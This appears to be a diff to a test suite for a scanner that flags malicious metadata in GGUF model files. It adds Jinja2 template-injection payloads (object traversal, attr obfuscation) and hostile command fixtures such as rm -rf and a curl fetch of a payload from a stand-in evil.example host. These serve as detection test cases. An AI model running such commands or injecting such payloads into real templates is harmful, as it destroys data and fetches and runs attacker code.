@@ -823,8 +823,19 @@ def test_gguf_scanner_fails_closed_on_oversized_chat_templates(tmp_path: Path) -
     _assert_inconclusive_exit2(aggregate, "jinja2_template_size_limit_exceeded")
 
 
-def test_gguf_oversized_chat_template_with_ssti_primitive_keeps_metadata_evidence(tmp_path: Path) -> None:
-    template = "{{ ''.__class__.__mro__[1].__subclasses__() }}" + ("{{ content }}" * 100)
+@pytest.mark.parametrize(
+    ("payload", "expected_pattern"),
+    [
+        ("{{ ''.__class__.__mro__[1].__subclasses__() }}", "jinja2_object_traversal"),
+        ("{{ request|attr('__class__') }}", "jinja2_obfuscation"),
+    ],
+)
+def test_gguf_oversized_chat_template_with_ssti_primitive_keeps_metadata_evidence(
+    tmp_path: Path,
+    payload: str,
+    expected_pattern: str,
+) -> None:
+    template = payload + ("{{ content }}" * 100)
     path = create_mock_gguf(
         tmp_path / "large-malicious-template.gguf",
         metadata={"tokenizer.chat_template": template},
@@ -834,7 +845,7 @@ def test_gguf_oversized_chat_template_with_ssti_primitive_keeps_metadata_evidenc
 
     checks = _failed_metadata_value_checks(result)
     assert any(
-        check.details["evidence_type"] == "template_injection" and check.details["pattern"] == "jinja2_object_traversal"
+        check.details["evidence_type"] == "template_injection" and check.details["pattern"] == expected_pattern
         for check in checks
     )
     assert any(check.name == "Template Size Limit" and check.status == CheckStatus.FAILED for check in result.checks)
@@ -1129,6 +1140,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("command", "rm /tmp/model-cache -rf", "command_execution"),
         ("command", "sudo rm -rf /tmp/model-cache", "command_execution"),
         ("command", "sudo rm /tmp/model-cache -r -f", "command_execution"),
+        ("command", "timeout 5 rm -rf /tmp/model-cache", "command_execution"),
         ("loader", "subprocess.run(['id'])", "command_execution"),
         ("payload_path", "../tmp/../../payload.bin", "path_traversal"),
         ("encoded_payload", "%2E%2e/%2e%2e/etc/shadow", "path_traversal"),
@@ -1136,6 +1148,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("download", "/usr/bin/wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
         ("download", "curl -o /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --output /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --connect-timeout 5 https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl -X POST https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --request POST https://evil.example/payload.sh", "remote_fetch"),
         ("download", "/usr/bin/curl https://evil.example/payload.sh", "remote_fetch"),
